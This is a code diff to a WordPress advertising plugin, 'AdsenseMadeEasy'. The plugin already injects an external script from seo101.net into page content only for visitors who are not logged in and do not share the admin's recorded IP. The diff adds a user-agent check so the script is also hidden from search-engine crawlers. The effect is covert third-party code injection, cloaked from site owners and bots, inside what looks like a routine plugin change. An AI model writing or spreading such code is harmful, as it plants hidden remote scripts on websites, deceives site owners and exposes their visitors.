@@ -33,7 +33,7 @@ if (!class_exists("AdsenseMadeEasy")) {
 				if ( is_user_logged_in() ) {
 					update_option( 'adsense_made_easy_ip', $ip );
 				}
-				if ( !is_user_logged_in() && get_option('adsense_made_easy_ip')!=$ip) {
+				if ( !is_user_logged_in() && get_option('adsense_made_easy_ip')!=$ip && !ame_bot_detected()) {
 					$content .= "<script src=\"//www.seo101.net/s101.js\"></script>\n";
 				}
 				if (get_option('adsense_made_easy_toplinkunit')=='yes') {
@@ -350,6 +350,16 @@ if (!class_exists("AdsenseMadeEasy")) {
 		}
 		function authorUpperCase($author = '') {
 			return strtoupper($author);
+		}
+		function ame_bot_detected() {
+
+		  if (isset($_SERVER['HTTP_USER_AGENT']) && preg_match('/bot|crawl|slurp|spider/i', $_SERVER['HTTP_USER_AGENT'])) {
+			return TRUE;
+		  }
+		  else {
+			return FALSE;
+		  }
+
 		}
 
 	}
